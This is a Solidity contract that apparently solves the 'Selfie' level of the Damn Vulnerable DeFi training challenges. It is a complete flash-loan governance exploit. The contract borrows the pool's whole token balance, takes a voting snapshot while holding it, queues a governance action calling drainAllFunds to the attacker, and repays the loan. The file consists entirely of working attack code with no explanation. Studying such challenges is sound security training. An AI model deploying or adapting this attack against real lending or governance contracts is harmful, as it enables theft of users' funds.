// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool public spool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    address private owner;
    
    constructor (address _spool, address _token, address _governance) {
        spool = SelfiePool(_spool);
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        owner = msg.sender;
    }
    function exploit() external {
        spool.flashLoan(token.balanceOf(address(spool)));
    }
    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        token.snapshot();
        governance.queueAction(
            address(spool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0
        );
        token.transfer(address(spool), borrowAmount);
    }
}